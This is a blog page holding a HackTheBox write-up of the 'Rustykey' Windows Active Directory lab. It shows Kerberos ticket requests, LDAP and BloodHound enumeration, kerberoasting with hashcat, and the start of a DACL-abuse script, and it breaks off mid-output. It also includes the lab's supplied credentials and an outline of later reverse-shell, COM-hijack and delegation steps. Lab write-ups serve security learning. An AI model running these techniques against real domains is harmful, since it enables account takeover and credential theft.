<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Rustykey (Windows Hard) | SidePieceVillage</title><meta name="author" content="Jay"><meta name="copyright" content="Jay"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content=" This Windows Hard box starts off assumed breach. While enumerating with the credentials you find that NTLM is disabled. Using your credentials..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Rustykey (Windows Hard)",
  "url": "https://d34db33fb04h.github.io/2025/06/30/Rustykey/",
  "image": "https://d34db33fb04h.github.io/img/rustykey.png",
  "datePublished": "2025-06-30T22:56:04.000Z",
  "dateModified": "2025-08-21T14:05:33.732Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jay",
      "url": "https://d34db33fb04h.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/j-neon-oval.png"><link rel="canonical" href="https://d34db33fb04h.github.io/2025/06/30/Rustykey/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Rustykey (Windows Hard)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">59</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li><li><a class="site-page child" href="/categories/hacksmarter/"><i class="fa-fw fa-solid fa-computer"></i><span> HackSmarter</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/n8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/j-neon-oval.png" alt="Logo"><span class="site-name">SidePieceVillage</span></a><a class="nav-page-title" href="/"><span class="site-name">Rustykey (Windows Hard)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li><li><a class="site-page child" href="/categories/hacksmarter/"><i class="fa-fw fa-solid fa-computer"></i><span> HackSmarter</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Rustykey (Windows Hard)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-06-30T22:56:04.000Z" title="Created 2025-06-30 17:56:04">2025-06-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-08-21T14:05:33.732Z" title="Updated 2025-08-21 09:05:33">2025-08-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/htb/">htb</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/img/rustykey.png"></p>
<p>This Windows Hard box starts off assumed breach. While enumerating with the credentials you find that NTLM is disabled. Using your credentials you’re able to obtain a kerberos ticket that lets you get a bloodhound dump and further enumerate the machine. Once done, you’re able to kerberoast SPNs(Some did timeroast) and obtain some hashes, which one of them cracks to cleartext for <em>IT-Computer3$</em>. Using your new found credentials you’re able to abuse DACLs that allows our user to remove objects from the <em>Protected Objects</em> group. Thus allowing for <em>ForceChangePassword</em> and after successfully changing the password for <strong>bb.morgan</strong>, we are able to get a kerberos ticket, setup our krb5.conf and evil-winrm onto the box. </p>
<p>Enumeration as <strong>bb.morgan</strong> shows very little, yet we had a user <strong>ee.reed</strong> in the <em>Support</em> group. After changing his password, creating a reverse shell and using <em>RunasCs.exe</em>, we’re able to get a shell as <strong>ee.reed</strong>. Using <em>PrivescCheck.ps1</em> shows us a <em>COM Registry</em> component we have <em>FullAccess</em> over. Abusing this gets us a reverse shell as <strong>mm.turner</strong>. Looking back in bloodhound we see that <strong>mm.turner</strong> is apart of the <em>DelegationManagers</em> group. This allows us to <em>AddAllowedToAct</em> on the domain. Once we add the attribute, we use <em>Rubeus.exe</em> and perform Resource-Based Constrained Delegation. This gets us a TGS which we then can use to <em>secretsdump</em> the domain.</p>
<p><em>As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker &#x2F; 8#t5HE8L!W3A</em></p>
<h2 id="Initial-Nmap"><a href="#Initial-Nmap" class="headerlink" title="Initial Nmap"></a>Initial Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-29 04:15:29Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49727/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| p2p-conficker:</span><br><span class="line">|   Checking <span class="keyword">for</span> Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 51928/tcp): CLEAN (Couldn<span class="string">&#x27;t connect)</span></span><br><span class="line"><span class="string">|   Check 2 (port 27628/tcp): CLEAN (Couldn&#x27;</span>t connect)</span><br><span class="line">|   Check 3 (port 63867/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 46581/udp): CLEAN (Failed to receive data)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-time:</span><br><span class="line">|   <span class="built_in">date</span>: 2025-06-29T04:16:24</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: 0s</span><br></pre></td></tr></table></figure>

<p>Many ports open, but we can gather the domain name from it being <em>rustykey.htb</em>.</p>
<h2 id="Enum-of-rr-parker"><a href="#Enum-of-rr-parker" class="headerlink" title="Enum of rr.parker"></a>Enum of rr.parker</h2><p>With his creds I simply grabbed a TGT for him since NTLM is disabled and exported it for use.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">konoha# impacket-getTGT <span class="string">&#x27;rustykey.htb/rr.parker:8#t5HE8L!W3A&#x27;</span> -dc-ip 10.10.11.75</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> rr.parker.ccache</span><br><span class="line">konoha# <span class="built_in">export</span> KRB5CCNAME=./rr.parker.ccache</span><br></pre></td></tr></table></figure>

<p>SMB didn’t let us authenticate, but LDAP worked so we can get a bloodhound dump.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">konoha# nxc smb 10.10.11.75 -d rustykey.htb -k --use-kcache</span><br><span class="line">SMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)</span><br><span class="line">SMB         10.10.11.75     445    10.10.11.75      [-] rustykey.htb\ from ccache KDC_ERR_S_PRINCIPAL_UNKNOWN</span><br><span class="line">konoha# nxc ldap 10.10.11.75 -d rustykey.htb -k --use-kcache</span><br><span class="line">LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)</span><br><span class="line">LDAP        10.10.11.75     389    DC               [+] rustykey.htb\rr.parker from ccache</span><br><span class="line"></span><br><span class="line">konoha# bloodhound-python -d rustykey.htb -u <span class="string">&#x27;rr.parker&#x27;</span> -k -no-pass -ns 10.10.11.75 --zip -c Group,LocalAdmin,Session,Trusts,DCOM,RDP,PSRemote,LoggedOn,Container,ObjectProps,ACL</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 10S</span><br><span class="line">INFO: Compressing output into 20250701022158_bloodhound.zip</span><br></pre></td></tr></table></figure>

<h2 id="No-way-out-so-it-seemed"><a href="#No-way-out-so-it-seemed" class="headerlink" title="No way out so it seemed!!"></a>No way out so it seemed!!</h2><p>After loading up the data, we didn’t find much on our user. Never the less, we have credentials we can get a list of users and try kerberoasting.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">konoha# nxc ldap 10.10.11.75 -d rustykey.htb -k --use-kcache --<span class="built_in">users</span> --computers</span><br><span class="line">LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)</span><br><span class="line">LDAP        10.10.11.75     389    DC               [+] rustykey.htb\rr.parker from ccache</span><br><span class="line">LDAP        10.10.11.75     389    DC               [*] Skipping disabled account: krbtgt</span><br><span class="line">LDAP        10.10.11.75     389    DC               [*] Total of records returned 0</span><br><span class="line">LDAP        10.10.11.75     389    DC               [*] Enumerated 11 domain <span class="built_in">users</span>: rustykey.htb</span><br><span class="line">LDAP        10.10.11.75     389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-</span><br><span class="line">LDAP        10.10.11.75     389    DC               Administrator                 2025-06-04 17:52:22 0        Built-<span class="keyword">in</span> account <span class="keyword">for</span> administering the computer/domain</span><br><span class="line">LDAP        10.10.11.75     389    DC               Guest                         &lt;never&gt;             0        Built-<span class="keyword">in</span> account <span class="keyword">for</span> guest access to the computer/domain</span><br><span class="line">LDAP        10.10.11.75     389    DC               krbtgt                        2024-12-26 18:53:40 0        Key Distribution Center Service Account</span><br><span class="line">LDAP        10.10.11.75     389    DC               rr.parker                     2025-06-04 17:54:15 0</span><br><span class="line">LDAP        10.10.11.75     389    DC               mm.turner                     2024-12-27 04:18:39 0</span><br><span class="line">LDAP        10.10.11.75     389    DC               bb.morgan                     2025-07-01 02:16:40 0</span><br><span class="line">LDAP        10.10.11.75     389    DC               gg.anderson                   2025-07-01 02:16:40 0</span><br><span class="line">LDAP        10.10.11.75     389    DC               dd.ali                        2025-07-01 02:16:40 0</span><br><span class="line">LDAP        10.10.11.75     389    DC               ee.reed                       2025-07-01 02:16:40 0</span><br><span class="line">LDAP        10.10.11.75     389    DC               nn.marcos                     2024-12-27 05:34:50 0</span><br><span class="line">LDAP        10.10.11.75     389    DC               backupadmin                   2024-12-29 18:30:18 11</span><br><span class="line">LDAP        10.10.11.75     389    DC               [*] Total records returned: 16</span><br><span class="line">LDAP        10.10.11.75     389    DC               DC$</span><br><span class="line">LDAP        10.10.11.75     389    DC               Support-Computer1$</span><br><span class="line">LDAP        10.10.11.75     389    DC               Support-Computer2$</span><br><span class="line">LDAP        10.10.11.75     389    DC               Support-Computer3$</span><br><span class="line">LDAP        10.10.11.75     389    DC               Support-Computer4$</span><br><span class="line">LDAP        10.10.11.75     389    DC               Support-Computer5$</span><br><span class="line">LDAP        10.10.11.75     389    DC               Finance-Computer1$</span><br><span class="line">LDAP        10.10.11.75     389    DC               Finance-Computer2$</span><br><span class="line">LDAP        10.10.11.75     389    DC               Finance-Computer3$</span><br><span class="line">LDAP        10.10.11.75     389    DC               Finance-Computer4$</span><br><span class="line">LDAP        10.10.11.75     389    DC               Finance-Computer5$</span><br><span class="line">LDAP        10.10.11.75     389    DC               IT-Computer1$</span><br><span class="line">LDAP        10.10.11.75     389    DC               IT-Computer2$</span><br><span class="line">LDAP        10.10.11.75     389    DC               IT-Computer3$</span><br><span class="line">LDAP        10.10.11.75     389    DC               IT-Computer4$</span><br><span class="line">LDAP        10.10.11.75     389    DC               IT-Computer5$</span><br></pre></td></tr></table></figure>

<p>Lets make a list and try all these users and computers.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">konoha# impacket-GetUserSPNs -dc-ip 10.10.11.75 <span class="string">&#x27;rustykey.htb/rr.parker&#x27;</span> -usersfile user.lst -k -no-pass</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">$krb5tgs$23$*krbtgt<span class="variable">$RUSTYKEY</span>.HTB<span class="variable">$krbtgt</span>*$172f44f5c03cb0964a08add4f0727799$&lt;SNIP&gt;</span><br><span class="line">[-] Principal: rr.parker - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: mm.turner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: bb.morgan - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: gg.anderson - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: dd.ali - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: ee.reed - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: nn.marcos - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">[-] Principal: backupadmin - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found <span class="keyword">in</span> Kerberos database)</span><br><span class="line">$krb5tgs$23$*DC$<span class="variable">$RUSTYKEY</span>.HTB$DC$*$7664306543510d4896b1e31f823a0256$&lt;SNIP&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>This returns many hashes that we can try to crack offline. When we do we get one that cracks.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">konoha# hashcat HASHES --show</span><br><span class="line">Hash-mode was not specified with -m. Attempting to auto-detect <span class="built_in">hash</span> mode.</span><br><span class="line">The following mode was auto-detected as the only one matching your input <span class="built_in">hash</span>:</span><br><span class="line"></span><br><span class="line">13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol</span><br><span class="line"></span><br><span class="line">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</span><br><span class="line">Do NOT report auto-detect issues unless you are certain of the <span class="built_in">hash</span> <span class="built_in">type</span>.</span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*IT-Computer3$<span class="variable">$RUSTYKEY</span>.HTB<span class="variable">$IT</span>-Computer3$*$1424a46c534b22e4a188835b00461505<span class="variable">$8ebe6eacca6940cec84b7fd9a6</span>&lt;SNIP&gt;:&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/img/bingo.gif"></p>
<p>We now have new credentials to <em>IT-Computer3$</em>. We can look back at Bloodhound and see what permissions we have and looking as we have some interesting ones, we can start there. </p>
<p><img src="/img/rustykeybh.png"></p>
<p>From this we have the following:</p>
<ul>
<li><strong>AddSelf</strong><ul>
<li>HelpDesk</li>
</ul>
</li>
<li><strong>ForceChangePassword</strong><ul>
<li>bb.morgan</li>
<li>ee.reed</li>
<li>gg.anderson<ul>
<li><strong>GenericWrite</strong><ul>
<li>dd.ali</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><strong>AddMember</strong><ul>
<li>Protected Objects</li>
</ul>
</li>
</ul>
<p>So we can add ourselves to <em>HelpDesk</em> group and then we can remove the <em>IT</em> and <em>Support</em> groups from the <em>Protected Objects</em> group. This will let us change the passwords for these users and requests TGTs for them. I created a little script that lets me do all this at once.</p>
<p><em>Error states the entry already exists, as the comptuer already has been added to the HelpDesk group already</em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">konoha# ./runRCE.sh</span><br><span class="line">Retriving TGT</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> IT-Computer3$.ccache</span><br><span class="line">Exporting Ticket</span><br><span class="line">Adding Computer to Helpdesk</span><br><span class="line">[+] Connection URL: ldap+kerberos-ccache://rustykey.htb\IT-Computer3%24:.%2FIT-Computer3%24.ccache@DC.rustykey.htb/?serverip=10.10.11.75&amp;dc=10.10.11.75</span><br><span class="line">[*] Trying to connect to DC.rustykey.htb...</span><br><span class="line">[+] Connection successful</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/.local/bin/bloodyAD&quot;</span>, line 8, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    sys.exit(main())</span><br><span class="line">             ~~~~^^</span><br><span class="line">  File <span 